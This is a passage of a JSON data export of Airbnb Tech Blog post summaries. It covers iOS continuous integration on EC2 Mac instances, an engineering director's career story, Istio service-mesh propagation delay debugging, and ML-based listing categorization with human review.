specified.Benefits of Our New iOS CI\u00a0SystemCI Environments Are Highly\u00a0FlexibleWith this new Terraform setup we are able to support an arbitrary number of CI environments with minimal overhead. We create a new CI environment per CPU architecture and version of Xcode. We can even duplicate these environments across multiple versions of macOS when performing an operating system update across our fleet. We use dedicated staging environments to test CI jobs on instances launched from a new AMI before we roll out that AMI\u00a0broadly.When we are no longer regularly using a CI environment, we can specify a minimum capacity of zero when calling the Terraform module, which will set the same value on the underlying Auto Scaling group. Then the Auto Scaling group will only launch instances when its desired capacity is increased by the scaling service. In practice, we tend to delete older environments from our Terraform code. However, even once an environment has been wound down, reinstating that environment is as simple as reverting a couple of commits in Git and redeploying the scaling\u00a0service.Rotation of Instances Increases CI ConsistencyTo minimize the opportunity for EC2 instances to drift, we terminate all instances each night and replace them daily. This way, we can be confident that our CI fleet is in a known good state at the start of each\u00a0day.When an instance is terminated, the underlying Dedicated Host is scrubbed before a new instance can be launched on that host. We terminate instances at a time when CI demand is low to allow for the EC2 Mac scrubbing process to complete before we need to launch fresh instances on the same hosts. When an instance terminates itself overnight, it will decrement the desired capacity of the Auto Scaling group to which it belongs. As engineers start pushing commits the next day, the scaling service will increment the desired capacity on the appropriate Auto Scaling groups, causing new instances to be launched.Instances terminate themselves overnight. We reduce our maximum capacity over weekends. The spikes in job volume that increased capacity on the 2nd, 6th, and 7th have been hidden by smoothing in the\u00a0chart.When an instance does experience configuration drift, we can disconnect that instance from Buildkite with one click. The instance will remain running but will no longer accept new CI jobs. An engineer can log into the instance to investigate its state until the instance is eventually terminated at the end of the day. To keep overall CI capacity stable, we can manually add an additional instance to our fleet, or a replacement will be launched automatically if we terminate the instance\u00a0early.We Ship Xcode Versions More\u00a0QuicklyWe appreciate the new capabilities of our upgraded CI system. We can lease additional Dedicated Hosts from Amazon on demand to weather unexpected spikes in CI usage and to test software updates thoroughly. We roll out new AMIs gradually and can roll back painlessly if we encounter unexpected issues.CI jobs shift from Xcode 14.1 to 14.2. On the 24th, we temporarily increased 14.2 capacity to accommodate a spike in\u00a0jobs.Together, these capabilities get Airbnb iOS developers access to Swift language features and Xcode IDE improvements more quickly. In fact, with the tailwind of our new CI system, we have seen the pace at which we update Xcode increase by over 20%. As of the time of writing, we have internally rolled out all available major and minor versions of Xcode 14 (14.0\u201314.3) as they have been released.The Migration is\u00a0CompleteOur new CI system ran over 10 million minutes of CI jobs in the last three months of 2022. After upgrading to EC2, we spend meaningfully fewer hours on maintenance despite a growing codebase and consistently high job volume. Our newfound ability to scale CI to meet the evolving needs of the Airbnb iOS community justifies the increased complexity of the rebuilt\u00a0system.After the migration to AWS, iOS CI benefits more from shared infrastructure that is already being used successfully within Airbnb. For example, the new iOS CI architecture enabled us to avoid implementing an iOS-specific solution for automatically scaling capacity. Instead, we leverage the aforementioned fork of buildkite-agent-scaler that Airbnb engineers had already converted to an internal Airbnb service complete with a dedicated deployment pipeline. Additionally, we used existing Terraform modules that are maintained by other teams to integrate with IAM and\u00a0SSM.We have found that EC2 Mac instances launched from custom AMIs provide many of the benefits of virtualization without the performance penalty of executing within a virtual machine. We consider AWS, Packer, and Terraform to be essential technologies for building a flexible CI system for large-scale iOS development in\u00a02023.Xianwen Chen, the technical lead of this project, designed the topology of the iOS CI system, implemented the design with Terraform, and later enabled creation of AMIs in the cloud. Michael Bachand built the initial version of our Packer tooling and used this tooling to create the first programmatically built AMIs capable of completing iOS CI jobs. Steven Hepting productionized our Packer tooling by adding support for Arm AMIs and evolving the Packer template so that all of Airbnb\u2019s iOS CI jobs could run successfully on both CPU architectures.We received invaluable support from numerous subject-matter experts at Airbnb who were very generous with their time. Many thanks to Brandon Kurtz for advising on content and voice through multiple revisions of this\u00a0article.If you are interested in joining us on our quest to make the best iOS app in the App Store, please see our careers page for open iOS\u00a0roles.All product names, logos, and brands are property of their respective owners. All company, product and service names used in this website are for identification purposes only. Use of these names, logos, and brands does not imply endorsement.Flexible Continuous Integration for iOS was originally published in The Airbnb Tech Blog on Medium, where people are continuing the conversation by highlighting and responding to this story.", "content": "", "cover_photo_url": "https://miro.medium.com/v2/resize:fit:1200/1*mGebUVa4KQWzQvo_YDSffQ.jpeg", "profile": 3, "updated_on": "2023-05-10T17:01:55Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12216.0812967, "slug": "flexible-continuous-integration-for-ios-107", "topics": [42, 26, 40, 41, 39]}}, {"model": "app.post", "pk": 108, "fields": {"title": "My Journey to Airbnb\u200a\u2014\u200aMichael Kinoti", "link": "https://medium.com/airbnb-engineering/my-journey-to-airbnb-michael-kinoti-645d4c228d06?source=rss----53c7c27702d5---4", "source": 1, "normalized_link": "medium.com/airbnb-engineering/my-journey-to-airbnb-michael-kinoti-645d4c228d06", "summary": "My Journey to Airbnb\u200a\u2014\u200aMichael\u00a0KinotiSaying no to med school and following a dream all the way to Silicon\u00a0ValleyBecoming a doctor and trying to make it as a DJ have both crossed Michael Kinoti\u2019s mind at one time or another. Instead, we\u2019re lucky to have Michael (who goes by Kinoti) as Airbnb\u2019s Director of Engineering for the Marketing Technology team. He brings with him over 15 years of industry experience at Microsoft and Uber, as well as a global perspective from his childhood in Kenya. Kinoti is passionate about travel and having a large-scale social impact, qualities that align nicely with Airbnb\u2019s mission and vision. Here\u2019s Kinoti\u2019s story in his own\u00a0words.Doctor, lawyer, or engineer?Anybody who grew up in Kenya around when I did is probably aware that medicine, law, and engineering were the only options for an ambitious student. And at least in my family, while all three careers were highly regarded, nothing was quite as prized as becoming a\u00a0doctor.Needless to say, I made my parents very proud when I was accepted to medical school. This is the story of the more than 20 years since, during which I\u2019ve learned so much and have found my niche\u200a\u2014\u200aas a software engineering leader.Choosing my own adventureIt may help to describe how I arrived at that medical school acceptance in the first place, and how by that time, I had already started developing an interest in computers. As the child of an entrepreneur father and an engineer mother, I am grateful to have had two amazing role models from a young age. My mother\u2019s grit has been particularly inspiring. She was the only female in her university cohort, and time and time again she has had to work harder than everybody else to prove herself. She became a leader at Kenya\u2019s major telecom company and directly contributed to bringing the country high-speed Internet, giving my generation and ones after access to a world of information.Always proponents of education, my parents sent me to one of the country\u2019s premier institutions, the Starehe Boys\u2019 Centre and School. The school\u2019s mission is to develop youth into better human beings and leaders, with an emphasis on a holistic education beyond just academics. To this day, I live by the school\u2019s values: integrity, leadership, and\u00a0service.I was lucky to be one of the first students in Kenya to take a computer studies course in school. While most students used the computer lab to play video games, myself included, I spent a lot of my time learning how to code. Seeing my deep interest in programming, my classmates would joke that I was going to be the next Bill Gates. I think those formative experiences instilled in me a dream to one day work at Microsoft, one of the biggest technology companies in the world. I wanted to make an impact through technology, which I saw and continue to see as an engine for leveling the global playing field. At the time, however, that was all just a dream and Redmond, Washington couldn\u2019t have felt further\u00a0away.For a while, I put chasing that dream on hold as I applied to medical school and was later accepted. Everything was set for me to matriculate in six months\u2019 time, and during that gap I took the opportunity to get some more hands-on coding experience. I realized that medicine wasn\u2019t for me and that not only did I want to study software engineering, but I wanted to come to the United States to be as close as possible to Silicon\u00a0Valley.It took a lot of courage to admit this change of heart to my parents, and their initial reaction was a pragmatic one\u200a\u2014\u200ait was too expensive, too far, and just not feasible to go abroad. Still, I was motivated to give it a try, so I took the SAT on my own and did everything else needed to apply to American colleges. I received some acceptance letters and, by showing my initiative, convinced my parents that my dream might be within reach after\u00a0all.Dreams do come true, but then\u00a0what?I remember being extremely excited leading up to my move to the US, until about halfway through the plane journey when it hit me that I was leaving my family and everything I knew behind. I had to overcome that fear and the imposter syndrome that came from doubting whether I picked the right path. To add to that, there\u2019s a lot of culture shock that accompanies moving continents. For the first time in my life I was an ethnic minority and had to grapple with what that\u00a0meant.For me, the culture shock extended into the classroom, too. I enrolled at the Florida Institute of Technology to study software engineering. It was my first time seeing students challenging teachers and engaging in open discussions. Putting myself in a new environment exposed me to an entirely new\u00a0outlook.The amount of effort I put into adjusting to my new home paid off more than I could have ever imagined. I used to be a kid in Kenya with a vague sense that coming to America was the right move for me. With a lot of hard work, I got a job at my dream company: Microsoft!Microsoft had so much support and mentorship, along with growth and learning opportunities that kept me busy for 11 years. To an extent, I was still following the mindset I grew up with that values loyalty. The path was clear: I could have stayed at the company indefinitely, then gotten married, and soon after started a family. What I learned from all the friends I made over those years, however, is that Microsoft is just one of many companies doing amazing things. Once you get to a point in your career where you\u2019re not growing the same way, you\u2019re not learning the same way, or you just want a different challenge, it\u2019s okay to\u00a0change.I had focused on infrastructure during my time at Microsoft, and as much as I enjoyed it, I wanted to keep exploring. I joined Uber to lead the team building the company\u2019s customer support platform. This is where I discovered my niche for building platforms at the sweet spot between product and infrastructure. I love being able to shape systems that directly affect millions of people and translate into features that people can see and\u00a0feel.Why I picked\u00a0AirbnbAfter a bit over three years at Uber, I made the switch to Airbnb, which felt right for so many reasons. Airbnb\u2019s mission around building belonging and connection really resonated with me. The company has an ambitious vision, and I believe promoting belonging and connection are fundamental to solving so many other societal problems. This, in addition to travel being a passion of mine (I\u2019ve been to 55 countries across 6 continents!) made me very excited about\u00a0Airbnb.The way Airbnb works toward its mission is unique. We have a creative touch when it comes to technology, something our CEO, Brian, encourages a lot. We care deeply about the details and chasing perfection in a healthy way. Of course, there\u2019s no such thing as actual perfection, but to strive for that the way we do at Airbnb produces great results, something our users see every time they interact with the\u00a0product.Arguably the biggest factor in my decision, though, was Airbnb\u2019s culture. This can be hard to fully put into words; what I love about Airbnb\u2019s culture comes through in all the little things you experience day to day. There\u2019s a genuine warmness between people who seek to build belonging and connection everywhere they go. People are welcoming, particularly to new hires. Even the interview process at Airbnb feels more human and conversational, which is different from so many other companies. Culture starts with the details and adds up into bigger things too: I think Airbnb truly excels at work-life integration and as somebody who recently started a family, I\u2019m very glad I came\u00a0here.Integrity, leadership, and service at\u00a0AirbnbAt Airbnb, I lead the Marketing Technology (Growth Platform) team responsible for Canvas, an internal platform that enables marketing and product teams to effectively engage with customers. Our overarching goal is to drive business growth and product engagement. Canvas has tools for creating, managing, and measuring content that gets published both to Airbnb and offsite channels such as emails, notifications, and ads. I\u2019ve reaffirmed how much I enjoy my role as a platform owner since I get to be at the nexus of so many areas that are important to the overall business. I get to think about everything from notifications, to personalization using machine learning, to the underlying infrastructure powering it\u00a0all.On a daily basis, I put into practice the three values I\u2019ve lived by since my days in school: integrity, leadership, and service. My philosophy around leadership is that it\u2019s not about power or being in charge. Rather, leadership is a form of service. I make a point to be empathetic, and my mission as a leader is to unlock the best in others through coaching and mentorship. My own mentors and coaches have played a large part in getting me to where I am, and I seek to pay that\u00a0forward.Of course, integrity also remains at the heart of every decision I make as a leader. Privacy and compliance are key focus areas for my team right now, which I enjoy because of the strong alignment those goals have with my value of integrity. To me, integrity means handling user data with the same care I\u2019d want for my own\u00a0data.Currently, we\u2019re also doing cutting-edge work on personalizing our marketing. Instead of blasting out the same email campaign to every user, we want to identify the journey a particular user is on and customize the content they see to be more relevant. Not only is this an interesting technical problem, it\u2019s a nuanced issue of respecting user privacy while offering a more tailored experience.In the last couple years, Airbnb has been undergoing an incredible transformation from a startup into a mature company. There\u2019s a huge modernization effort within the company to scale our tech stack to match the scale at which we have a global impact. If that\u2019s interesting to you, I encourage you to check out openings at Airbnb. If there\u2019s one thing I\u2019ve learned from the wild ride I\u2019ve had so far is that there\u2019s no set path you need to follow\u200a\u2014\u200atake a chance, and you\u2019ll be amazed by what you might\u00a0achieve.My Journey to Airbnb\u200a\u2014\u200aMichael Kinoti was originally published in The Airbnb Tech Blog on Medium, where people are continuing the conversation by highlighting and responding to this story.", "content": "", "cover_photo_url": "https://miro.medium.com/v2/resize:fit:1200/1*X0-h_g8Qrt3TWzbOuBzzMw.jpeg", "profile": 3, "updated_on": "2023-04-26T20:26:57Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12189.4746744, "slug": "my-journey-to-airbnb-michael-kinoti-108", "topics": [26, 43, 44, 32]}}, {"model": "app.post", "pk": 109, "fields": {"title": "Improving Istio Propagation Delay", "link": "https://medium.com/airbnb-engineering/improving-istio-propagation-delay-d4da9b5b9f90?source=rss----53c7c27702d5---4", "source": 1, "normalized_link": "medium.com/airbnb-engineering/improving-istio-propagation-delay-d4da9b5b9f90", "summary": "A case study in service mesh performance optimizationby: Ying\u00a0ZhuIntroductionIn this article, we\u2019ll showcase how we identified and addressed a service mesh performance problem at Airbnb, providing insights into the process of troubleshooting service mesh\u00a0issues.BackgroundAt Airbnb, we use a microservices architecture, which requires efficient communication between services. Initially, we developed a homegrown service discovery system called Smartstack exactly for this purpose. As the company grew, however, we encountered scalability issues\u00b9. To address this, in 2019, we invested in a modern service mesh solution called AirMesh, built on the open-source Istio software. Currently, over 90% of our production traffic has been migrated to AirMesh, with plans to complete the migration by\u00a02023.The Symptom: Increased Propagation DelayAfter we upgraded Istio from 1.11 to 1.12, we noticed a puzzling increase in the propagation delay\u200a\u2014\u200athe time between when the Istio control plane gets notified of a change event and when the change is processed and pushed to a workload. This delay is important for our service owners because they depend on it to make critical routing decisions. For example, servers need to have a graceful shutdown period longer than the propagation delay, otherwise clients can send requests to already-shut-down server workloads and get 503\u00a0errors.Data Gathering: Propagation Delay\u00a0MetricsHere\u2019s how we discovered the condition: we had been monitoring the Istio metric pilot_proxy_convergence_time for propagation delay when we noticed an increase from 1.5 seconds (p90 in Istio 1.11) to 4.5 seconds (p90 in Istio 1.12). Pilot_proxy_convergence_time is one of several metrics Istio records for propagation delay. The complete list of metrics\u00a0is:pilot_proxy_convergence_time\u200a\u2014\u200ameasures the time from when a push request is added to the push queue to when it is processed and pushed to a workload proxy. (Note that change events are converted into push requests and are batched through a process called debounce before being added to the queue, which we will go into details\u00a0later.)pilot_proxy_queue_time\u200a\u2014\u200ameasures the time between a push request enqueue and\u00a0dequeue.pilot_xds_push_time\u200a\u2014\u200ameasures the time for building and sending the xDS resources. Istio leverages Envoy as its data plane. Istiod, the control plane of Istio, configures Envoy through the xDS API (where x can be viewed as a variable, and DS stands for discovery service).pilot_xds_send_time\u200a\u2014\u200ameasures the time for actually sending the xDS resources.The diagram below shows how each of these metrics maps to the life of a push\u00a0request.A high level graph to help understand the metrics related to propagation delay.InvestigationxDS Lock ContentionCPU profiling showed no noticeable changes between 1.11 and 1.12, but handling push requests took longer, indicating time was spent on some waiting events. This led to the suspicion of lock contention issues.Istio uses four types of xDS resources to configure Envoy:Endpoint Discovery Service (EDS)\u200a\u2014\u200adescribes how to discover members of an upstream\u00a0cluster.Cluster Discovery Service (CDS)\u200a\u2014\u200adescribes how to discover upstream clusters used during\u00a0routing.Route Discovery Service (RDS) \u2013describes how to discover the route configuration for an HTTP connection manager filter at\u00a0runtime.Listener Discovery Service (LDS) \u2013describes how to discover the listeners at\u00a0runtime.Analysis of the metric pilot_xds_push_time showed that only three types of pushes (EDS, CDS, RDS) increased after the upgrade to 1.12. The Istio changelog revealed that CDS and RDS caching was added in\u00a01.12.To verify that these changes were indeed the culprits, we tried turning off the caches by setting PILOT_ENABLE_CDS_CACHE and PILOT_ENABLE_RDS_CACHE to \u201cFalse\u201d. When we did this, pilot_xds_push_time for CDS reverted back to the 1.11 level, but not RDS or EDS. This improved the pilot_proxy_convergence_time, but not enough to return it to the previous level. We believed that there was something else affecting the\u00a0results.Further investigation into the xDS cache revealed that all xDS computations shared one cache. The tricky thing is that Istio used an LRU Cache under the hood. The cache is locked not only on writes, but also on reads, because when you read from the cache, you need to promote the item to most recently used. This caused lock contention and slow processing due to multiple threads trying to access the same lock at the same\u00a0time.The hypothesis formed was that xDS cache lock contention caused slowdowns for CDS and RDS because caching was turned on for those two resources, and also impacted EDS due to the shared cache, but not LDS as it did not have caching implemented.But why turning off both CDS and RDS cache does not solve the problem? By looking at where the cache was used when building RDS, we found out that the flag PILOT_ENABLE_RDS_CACHE was not respected. We fixed that bug and conducted performance testing in our test mesh to verify our hypothesis with the following setup:Control plane:- 1 Istiod pod (memory 26 G, cpu 10\u00a0cores)Data plane:- 50 services and 500 pods- We mimicked changes by restarting deployments randomly every 10 seconds and changing virtual service routings randomly every 5\u00a0secondsHere were the\u00a0results:A table of results\u00b2 for the perfomance testing.Because our Istiod pods were not CPU intensive, we decided to disable the CDS and RDS caches for the moment. As a result, propagation delays returned to the previous level. Here is the Istio issue for this problem and potential future improvement of the xDS\u00a0cache.DebounceHere\u2019s a twist in our diagnosis: during the deep dive of Istio code base, we realized that pilot_proxy_convergence_time does not actually fully capture propagation delay. We observed in our production that 503 errors happen during server deployment even when we set graceful shutdown time longer than pilot_proxy_convergence_time. This metric does not accurately reflect what we want it to reflect and we need to redefine it. Let\u2019s revisit our network diagram, zoomed out to include the debounce process to capture the full life of a change\u00a0event.A high level diagram of the life of a change\u00a0event.The process starts when a change notifies an Istiod controller\u00b3. This triggers a push which is sent to the push channel. Istiod then groups these changes together into one combined push request through a process called debouncing. Next, Istiod calculates the push context which contains all the necessary information for generating xDS. The push request together with the context are then added to the push queue. Here\u2019s the problem: pilot_proxy_convergence_time only measures the time from when the combined push is added to the push queue, to when a proxy receives the calculated xDS.From Istiod logs we found out that the debounce time was almost 110 seconds, even though we set PILOT_DEBOUNCE_MAX to 30 seconds. From reading the code, we realized that the initPushContext step was blocking the next debounce to ensure that older changes are processed first.To debug and test changes, we needed a testing environment. However, it was difficult to generate the same load on our test environment. Fortunately, the debounce and init push context are not affected by the number of Istio proxies. We set up a development box in production with no connected proxies and ran custom images to triage and test out\u00a0fixes.We performed CPU profiling and took a closer look into functions that were taking a long\u00a0time:A CPU profile of\u00a0Istiod.A significant amount of time was spent on the Service DeepCopy function. This was due to the use of the copystructure library that used go reflection to do deep copy, which has expensive performance. Removing the library\u2074 was both easy and very effective at reducing our debounce time from 110 seconds to 50\u00a0seconds.A CPU profile of Istiod after DeepCopy improvement.After the DeepCopy improvement, the next big chunk from the cpu profile was the ConvertToSidecarScope function. This function took a long time to determine which virtual services were imported by each Istio proxy. For each proxy egress host, Istiod first computed all the virtual services exported to the proxy\u2019s namespace, then selected the virtual services by matching proxy egress host name to the virtual services\u2019 hosts.All our virtual services were public as we did not specify the exportTo parameter, which is a list of namespaces to which this virtual service is exported. If this parameter is not configured, the virtual service is automatically exported to all namespaces. Therefore, VirtualServicesForGateway function created and copied all virtual services each time. This deep-copy of slice elements was very expensive when we had many proxies with multiple egress\u00a0hosts.We reduced the unnecessary copy of virtual services: instead of passing a copied version of the virtual services, we passed the virtualServiceIndex directly into the select function, further reducing the debounce time from 50 seconds to around 30\u00a0seconds.Another improvement that we are currently rolling out is to limit where virtual services are exported by setting the exportTo field, based on which clients are allowed to access the services. This should reduce debounce time by about 10\u00a0seconds.The Istio community is also actively working on improving the push context calculation. Some ideas include adding multiple workers to compute the sidecar scope, processing changed sidecars only instead of rebuilding the entire sidecar scope. We also added metrics for the debounce time so that we can monitor this together with the proxy convergence time to track accurate propagation delay.ConclusionTo conclude our diagnosis, we learned\u00a0that:We should use both pilot_debounce_time and pilot_proxy_convergence_time to track propagation delay.xDS cache can help with CPU usage but can impact propagation delay due to lock contention, tune PILOT_ENABLE_CDS_CACHE & PILOT_ENABLE_RDS_CACHE to see what\u2019s best for your\u00a0system.Restrict the visibility of your Istio manifests by setting the exportTo\u00a0field.If this type of work interests you, check out some of our related\u00a0roles!AcknowledgmentsThanks to the Istio community for creating a great open source project and for collaborating with us to make it even better. Also call out to the whole AirMesh team for building, maintaining and improving the service mesh layer at Airbnb. Thanks to Lauren Mackevich, Mark Giangreco and Surashree Kulkarni for editing the\u00a0post.[1]: Checkout our presentation Airbnb on Istio for\u00a0details.[2]: Note that some CPU throttling occurred for the last two cases, so if we were to allocate more CPU we would expect propagation delay (especially P99) to improve\u00a0further.[3]: Istiod service controller monitors changes to registered services from different sources including kubernetes service, ServiceEntry created service, etc., Istiod config controller monitors changes to the Istio resources used to manage those services.[4]: PR1,\u00a0PR2Improving Istio Propagation Delay was originally published in The Airbnb Tech Blog on Medium, where people are continuing the conversation by highlighting and responding to this story.", "content": "", "cover_photo_url": "https://miro.medium.com/v2/resize:fit:1200/1*tvfIu34QvOy1IBNTNGXoAQ.jpeg", "profile": 3, "updated_on": "2023-03-23T18:20:38Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12124.0262522, "slug": "improving-istio-propagation-delay-109", "topics": [26, 45, 46, 27]}}, {"model": "app.post", "pk": 110, "fields": {"title": "Building Airbnb Categories with ML & Human in the Loop", "link": "https://medium.com/airbnb-engineering/building-airbnb-categories-with-ml-human-in-the-loop-35b78a837725?source=rss----53c7c27702d5---4", "source": 1, "normalized_link": "medium.com/airbnb-engineering/building-airbnb-categories-with-ml-human-in-the-loop-35b78a837725", "summary": "Airbnb Categories Blog Series\u200a\u2014\u200aPart II\u00a0: ML Categorizationby: Mihajlo Grbovic, Pei Xiong, Pratiksha Kadam, Ying Xiao, Sherry Chen, Weiping Peng, Shukun Yang, Chen Qian, Haowei Zhang, Sebastien Dubois, Nate Ney, James Furnary, Mark Giangreco, Nate Rosenthal, Cole Baker, Aaron Yin, Bill Ulammandakh, Shankar Shetty, Sid Reddy, Egor\u00a0PakhomovAirbnb 2022 release introduced Categories, a browse focused product that allows the user to seek inspiration by browsing collections of homes revolving around a common theme, such as Lakefront, Countryside, Golf, Desert, National Parks, Surfing, etc. In Part I of our Categories Blog Series we covered the high level approach to creating Categories and showcasing them in the product. In this Part II we will describe the ML Categorization work in more\u00a0detail.Throughout the post we use the Lakefront category as a running example to showcase the ML-powered category development process. Similar process was applied for other categories, with category specific nuances. For example, some categories rely more on points of interests, while others more on structured listing signals, image data,\u00a0etc.Category DefinitionCategory development starts with a product-driven category definition: \u201cLakefront category should include listings that are less than 100 meters from the lake\u201d. While this may sound like an easy task at first, it is very delicate and complex as it involves leveraging multiple structured and unstructured listing attributes, points of interest (POIs), etc. It also involves training ML models that combine them, since none of the signals captures the entire space of possible candidates on their\u00a0own.Listing Understanding SignalsAs part of various past projects multiple teams at Airbnb spent time on processing different types of raw data to extract useful information in structured form. Our goal was to leverage these signals for cold-start rule-based category candidate generation and later use them as features of the ML model that could find category candidates with higher precision:Host provided listing information, such as property type (e.g. castle, houseboat), amenities & attributes (pool, fire pit, forest view, etc.). listing location, title, description, image captions that can be scanned for keywords (we gathered exhaustive sets of keywords in different languages per category).Host guidebooks, where hosts recommend nearby places for guests to visit (e.g. a Vineyard, Surf beach, Golf course) which hold locations data that was useful for extracting POIsAirbnb experiences, such as Surfing, Golfing, Scuba, etc. Locations of these activities proved useful in identifying listing candidates for certain activity-related categories.Guest reviews which is another source that can be scanned for keywords. We also collect supplemental guest reviews where guests provide feedback on listings quality, amenities and attributes.Wishlists that guests create when browsing, such as \u201cGolf trip 2022\u201d, \u201cBeachfront\u201d, \u201cYosemite trip\u201d, are often related to one of the categories, which proved useful for candidate generation.Figure 1. Popular wishlists created by airbnb\u00a0usersThe listing understanding knowledge base was further enriched using external data, such as Satellite data (tell us if a listing is close to an ocean, river or lake), Climate, Geospatial data, Population data (tells us if listing is in rural, urban or metropolitan area) and POI data that contains names and locations of places of interest from host guidebooks or collected by us via open source datasets and further improved, enriched and adjusted by in-house human\u00a0review.Finally, we leveraged our in-house ML models for additional knowledge extraction from raw listing data. These included ML models for Detecting amenities and objects in listing images, Categorizing room types and outdoor spaces in listing images,, Computing embedding similarities between listings and Assessing property aesthetics. Each of these were useful in different stages of category development, candidate generation, expansion and quality prediction, respectively.Rule-based candidate generationOnce a category is defined, we first leverage pre-computed listing understanding signals and ML model outputs described in the previous section to codify the definition with a set of rules. Our candidate generation engine then applies them to produce a set of rule-based candidates and prioritizes them for human review based on a category confidence score.This confidence score is computed based on how many signals qualified the listing to the category and the weights associated with each rule. For example, considering Lakefront category, vicinity to a Lake POIs carried the most weight, host provided signals on direct lake access were next more important, lakefront keywords found in listing title, description, wishlists, reviews carried less weight, while lake and water detection in listing images carried the least weight. A listing that would have all these attributes would have a very high confidence score, while a listing that would have only one would have a lower\u00a0score.Human review\u00a0processCandidates were sent for human review daily, by selecting a certain number of listings from each category with the highest category confidence score. Human agents then judged if listing belongs to the category, choose the best cover photo and assessed the quality of the listing (Figure\u00a03)As human reviews started rolling in and there were enough listings with confirmed and rejected category tags it unlocked new candidate generation techniques that started contributing their own candidates:Proximity based: leveraging distance to the confirmed listing in a given category, e.g. neighbor of a confirmed Lakefront listing it may also be LakefrontEmbedding similarity: leveraging listing embeddings to find listings that are most similar to confirmed listing in a given category.Training ML categorization models: once the agents reviewed 20% of rule-based candidates we started training ML\u00a0models.In the beginning, only agent vetted listings were sent to production and featured on the homepage. Over time, as our candidate generation techniques produced more candidates and the feedback loop repeated, it allowed us to train better and better ML models with more labeled data. Finally, at some point, when ML models were good enough, we started sending listings with high enough model scores to production (Figure\u00a02).Figure 2. Number of listings in production per category and fractions vetted by\u00a0humansAligning ML Models with Human review\u00a0tasksIn order to scale the review process we trained ML models that mimic each of the three human agent tasks (Figure 3). In the following sections we will demonstrate the training and evaluation process involved with each\u00a0modelFigure 3. ML models setup for mimicking human\u00a0reviewML Categorization ModelML Categorization Model task was to confidently place listings in a category. These models were trained using Bighead (Airbnb\u2019s ML platform) as XGBoost binary per category classification models. They used agent category assignments as labels and signals described in the Listing Understanding section as features. As opposed to a rule-based setting, ML models allowed us to have better control of the precision of candidates via model score threshold.Although many features are shared across categories and one could train a single multiclass model, due to the high imbalance in category sizes and dominance of category-specific features we found it better to train dedicated ML per category models. Another big reason for this was that a major change to a single category, such as change in definition, large addition of new POIs or labels, did not require us to retrain, launch and measure impact on all the categories, but instead conveniently work on a single category in isolation.Lakefront ML\u00a0modelFeatures: the first step was to build features, with the most important one being distance to Lake POI. We started with collecting Lake POIs represented as a single point and later added lake boundaries that trace the lake, which greatly improved the accuracy of being able to pull listings near the boundary. However, as shown in Figure 4, even then there were many edge cases that lead to mistakes in rule-based listing assignment.Figure 4. Examples of imperfect POI (left) and complex geography: highway between lake and home (middle), long backyards (right)These include imperfect lake boundaries that can be inside the water or outside on land, highways in between lake and houses, houses on cliffs, imperfect listing location, missing POIs, and POIs that are not actual lakes, like reservoirs, ponds etc. For this reason, it proved beneficial to combine POI data with other listing signals as ML model features and then use the model to proactively improve the Lake POI database.One modeling maneuver that proved to be useful here was feature dropout. Since most of the features were also used for generating rule-based candidates that were graded by agents, resulting in labels that are used by the ML model, there was a risk of overfitting and limited pattern discovery beyond the\u00a0rules.To address this problem, during training we would randomly drop some feature signals, such as distance from Lake POI, from some listings. As a result, the model did not over rely on the dominant POI feature, which allowed listings to have a high ML score even if they are not close to any known Lake POI. This allowed us to find missing POIs and add them to our database.Labels: Positive labels were assigned to listings agents tagged as Lakefront, Negative labels were assigned to listings sent for review as Lakefront candidates but rejected (Hard negatives from modeling perspective). We also sampled negatives from related Lake House category that allows greater distance to lake (Easier negatives) and listings tagged in other categories (Easiest negatives)Train / Test split: 70:30 random split, where we had special handling of distance and embedding similarity features not to leak the\u00a0label.Figure 5. Lakefront ML model feature importance and performance evaluationWe trained several models using different feature subsets. We were interested in how well POI data can do on its own and what improvements can additional signals provide. As it can be observed in Figure 5, the POI distance is the most important feature by far. However, when used on its own it cannot approach the ML model performance. Specifically, the ML model improves Average Precision by 23%, from 0.74 to 0.91, which confirmed our hypothesis.Since the POI feature is the most important feature we invested in improving it by adding new POIs and refining existing POIs. This proved to be beneficial as the ML model using improved POI features greatly outperforms the model that used initial POI features (Figure\u00a05).The process of Lake POI refinement included leveraging trained ML model to find missing or imperfect POIs by inspecting listings that have a high model score but are far from existing Lake POIs (Figure 6 left) and removing wrong POIs by inspecting listings that have a low model score but are very close to an existing Lake POI (Figure 6\u00a0right)Figure 6. Process of finding missing POIs (Left) and wrong POIs\u00a0(Right)Sending confident listings to production: using the test set Precision-Recall curve we found a threshold that achieves 90% Precision. We used this threshold to make a decision on which candidates can go directly to production and which need to be sent for human review\u00a0first.Cover Image ML\u00a0modelTo carry out the second agent task with ML, we needed to train a different type of ML model. One whose task would be to choose the most appropriate listing cover photo given the category context. For example, choosing a listing photo with a lake view for the Lakefront category.We tested several out of the box object detection models as well as several in-house solutions trained using human review data, i.e. (listing id, category, cover photo id) tuples. We found that the best cover photo selection accuracy was achieved by fine-tuning a Vision Transformer model (VT) using our human review data. Once trained, the model can score all listing photos and decide which one is the best cover photo for a given category.To evaluate the model we used a hold out dataset and tested if the agent selected listing photo for a particular category was within the top 3 highest scoring VT model photos for the same category. The average Top 3 precision on all categories was 70%, which we found satisfactory.To further test the model we judged if the VT selected photo represented the category better than the Host selected cover photo (Figure 7). It was found that the VT model can select a better photo in 77% of the cases. It should be noted that the Host selected cover photo is typically chosen without taking any category into account, as the one that best represents the listing in the search\u00a0feed.Figure 7. Vision Transformer vs. Host selected cover photo selection for the same listing for Lakefront categoryIn addition to selecting the best cover photo for candidates that are sent to production by the ML categorization model, the VT model was also used to speed up the human review process. By ordering the candidate listing photos in descending order of the VT score we were able to improve the time it takes the agents to make a decision on a category and cover photo by\u00a018%.Finally, for some highly visual categories, such as Design, Creative spaces, the VT model proved to be useful for direct candidate generation.Quality ML\u00a0ModelThe final human review task is to judge the quality of the listing by selecting one of the four tiers: Most Inspiring, High Quality, Acceptable, Low Quality. As we will discuss in Part III of the blog series, the quality plays a role in ranking of listings in the search\u00a0feed.To train an ML model that can predict quality of a listing we used a combination of engagement, quality and visual signals to create a feature set and agent quality tags to create labels. The features included review ratings, wishlists, image quality, embedding signals and listing amenities and attributes, such as price, number of guests,\u00a0etc.Given the multi-class setup with four quality tiers, we experimented with different loss functions (pairwise loss, one-vs-all, one-vs-one, multi label, etc.). We then compared the ROC curves of different strategies on a hold-out set and the binary one-vs-all models performed the\u00a0best.Figure 8: Quality ML model feature importance and ROC\u00a0curveIn addition to playing a role in search ranking, the 